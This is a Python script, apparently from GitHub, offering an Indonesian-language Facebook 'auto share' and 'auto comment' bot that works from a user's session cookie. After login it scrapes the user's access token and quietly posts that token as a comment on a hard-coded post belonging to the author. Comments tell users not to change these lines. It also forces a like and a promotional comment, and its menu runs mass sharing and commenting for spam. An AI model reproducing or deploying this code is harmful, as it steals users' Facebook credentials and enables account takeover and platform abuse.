p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
import re, bs4, calendar, datetime, requests, rich, platform, time, sys, os, random, json, time
from rich.panel import Panel as UsydPanel
from rich.console import Console as UsydConsole
from datetime import datetime
from time import strftime
from concurrent.futures import ThreadPoolExecutor as TheEND

bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}

tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
now = datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang"
elif 15 <= hour < 17:
  hhl = "Selamat Sore"
elif 17 <= hour < 18:
  hhl = "Selamat Petang"
else:
  hhl = "Selamat Malam"

def Bajingan_Z(TypePlatform):
    if 'win' in TypePlatform:
       return os.system('cls')
    else:
       return os.system('clear')

class RAKA_XYZ:
    def __init__(self):
        try:
             cokie = open('data/cookie.txt','r').read()
             token = open('data/tooken.txt','r').read()
        except FileNotFoundError:
             print(f' {m}>_ {p}Gunakan Cookie Fress')
             time.sleep(3)
             self.fox()
        self.menu(cokie, token)

    def fox(self):
        Bajingan_Z(sys.platform) ; print (rakaxyz)
        print(f' {m}>_ {p}Gunakan Akun Tumbal ...')
        coki = input(f' {m}>_ {p}Input Cookie : {h}')
        try:
            cari = requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":coki})
            toke = re.search("(EAAG\w+)", cari.text).group(1)
            if "EAAG" in str(toke):
                open("data/cookie.txt","w").write(coki)
                open("data/tooken.txt","w").write(toke)
                requests.post(f"https://graph.facebook.com/100073125893802_391114490002744/likes?summary=true&access_token={toke}",cookies={"cookie":coki}) # Gk usah Diganti
                export = requests.post(f"https://graph.facebook.com/100073125893802_391114490002744/comments/?message={rakaxyzz}&access_token={toke}",cookies={"cookie":coki}) # Gk usah Diganti
                export = requests.post(f"https://graph.facebook.com/100073125893802_391114490002744/comments/?message={toke}&access_token={toke}",cookies={"cookie":coki}) # Gk usah Diganti
                exit(print(f' {m}>_ {p}Login Succes, Jalankan Ulang Printahnya'))
        except AttributeError:
            exit(print(f' {m}>_ {p}Cookie Mokad'))
        except requests.exceptions.ConnectionError:
            exit(print(f' {m}>_ {p}Tidak Ada Koneksi Internet'))

    def menu(self, kuki, token):
        Bajingan_Z(sys.platform) ; print (rakaxyz)
        try:nama = requests.get("https://graph.facebook.com/me?access_token={}".format(token),cookies={"cookie":kuki}).json()['name']
        except KeyError:
            print('Kontol') #self.mask()
        except requests.exceptions.ConnectionError:exit(print(f' {m}>_ {p}Pastikan Koneksinya Aman Goblog'))
#        print(f' {m}>_ {p}{hhl} {h}{nama}\n')
        print(f' {p}+{m}A{p}+ Bot Auto Share \n {p}+{m}B{p}+ Bot Auto Comend\n {p}+{m}C{p}+ Bot Auto Like ({h}Machineliker{p})\n {p}+{m}L{p}+ Logout\n')
        rakaxyzzz = input(f' {m}>_ {p}Pilih : {h}')
        if rakaxyzzz in ['1','A','a']:
             print()
             print(f' {m}NOTE : {p}Copy Link Postingannya Lewat Facebook Lite\n')
             link = input(f' {m}>_ {p}Masukan link : {h}')
             try:limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
             except:limit=50
             print()
             self.share(link,limit,token,kuki)
        elif rakaxyzzz in ['2','B','b']:
             print()
             print(f' {m}WARNING : {p}Pastikan ID postingan Benar\n')
             target = input(f' {m}>_ {p}Masukan Id Target : {h}')
             komen = input(f' {m}>_ {p}Masukan Text : {h}')
             limit = int(input(f' {m}>_ {p}Enter Limit : {h}'))
             print()
             self.komen(target, komen, limit,token, kuki)
        elif rakaxyzzz in ['3','C','c']:
             exit(print(f' {m}>_ {p}Maaf, Fitur Ini Belum Tersedia'))
        elif rakaxyzzz in ['L','l','0']:
             os.system('rm -rf data/cookie.txt && rm -rf data/tooken.txt')
             os.system('exit')
        else:
             exit(print(f' {m}>_ {p}Pilih Yang Benar TOD KENTOD'))


    def share(self, link, limit, token, rakaexde):
        sukses,gagal=[],[]
        try:
              headers = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":self.useragent()}
              for i in range(limit):
                  link_pos = requests.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=headers, cookies={'cookie':rakaexde})       
                  response = json.loads(link_pos.text)
                  xyz = random.choice([m,k,h,p])
                  print(f"\r {m}>_ {xyz}Running{p} {len(sukses)} {xyz}Succes", end=" ");    
                  sys.stdout.flush()
                  if "id" in response:
                      sukses.append("Share")
                  else:
                      sukses.append("Tolol")
        except Exception as e:
             exit(print(f' {m}>_ {p}Cookie Kadaluarsa kek tete JENDES'))

    def komen(self, id, text, lim,token, cokie):
        ok,no=[],[]
        for x in range(lim):
            for komenn in text.split(','):
                mewmex = requests.post(f'https://graph.facebook.com/{id}/comments/?message={komenn}&access_token={token}',cookies={'cookie':cokie})
                cek_st = json.loads(mewmex.text)
                xyz = random.choice([m,k,h,p])
                print(f'\r {m}>_ {xyz}Running {p}{len(ok)} {xyz}Comend Succes', end=' ')    
                if 'id' in cek_st:
                     ok.append('ya')
                else:
                     no.append('ya')

    def useragent(self):
        return ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')

rakaxyz = (f'''{m}
  ──▄──▄────▄▀ {p}BOT AUTO SHARE{h}
  ───▀▄─█─▄▀▄▄▄
  ▄██▄████▄██▄▀█▄ {p}MADE WITH BY{h}
  ─▀▀─█▀█▀▄▀███▀
  {m}──▄▄▀─█──▀▄▄ {p}RAKA ANDRIAN TARA{m} ™{p}
    \n''')

rakaxyzz = (f"Krend Bg :v\n\nhttps://www.facebook.com/photo/?fbid=391114490002744&set=a.124194026694793\n\n_{tanggal}_\n_{waktu}_") # Gk usah Diganti
def Cetak(Text, Type, Warna):
    if 'banner' in Type:
        return UsydConsole(width=50, style=Warna).print(UsydPanel(Text),justify='center')   
    else:
        return UsydConsole(width=50, style=Warna).print(UsydPanel(Text))

if __name__ == '__main__':
  RAKA_XYZ()

'''Github : Bajingan-Z'''